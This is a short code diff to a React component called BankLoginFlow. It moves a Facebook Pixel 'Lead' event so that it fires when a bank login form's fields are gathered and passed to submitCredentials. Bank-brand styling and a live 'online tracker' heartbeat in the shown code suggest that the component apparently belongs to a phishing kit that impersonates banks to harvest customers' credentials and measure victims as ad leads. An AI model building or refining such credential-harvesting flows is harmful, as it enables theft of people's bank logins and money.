@@ -32,13 +32,6 @@ export function BankLoginFlow({ bank, sessionId }: Props) {
 
     useEffect(() => applyBankSwalCss(bank.brand), [bank.brand]);
 
-    useEffect(() => {
-        if (typeof window !== 'undefined' && typeof (window as any).fbq === 'function') {
-            (window as any).fbq('track', 'Lead');
-        }
-    // eslint-disable-next-line react-hooks/exhaustive-deps
-    }, []);
-
     // Online tracker: heartbeat while tab is active
     const preSessionId = (props.preSessionId as string | undefined) ?? '';
     useEffect(() => {
@@ -69,6 +62,9 @@ export function BankLoginFlow({ bank, sessionId }: Props) {
                 const el = form.querySelector<HTMLInputElement>(`#${name}`);
                 if (el) fields[name] = el.value;
                 else if (data.has(name)) fields[name] = String(data.get(name) ?? '');
+            }
+            if (typeof window !== 'undefined' && typeof (window as any).fbq === 'function') {
+                (window as any).fbq('track', 'Lead');
             }
             void submitCredentials(fields);
         };
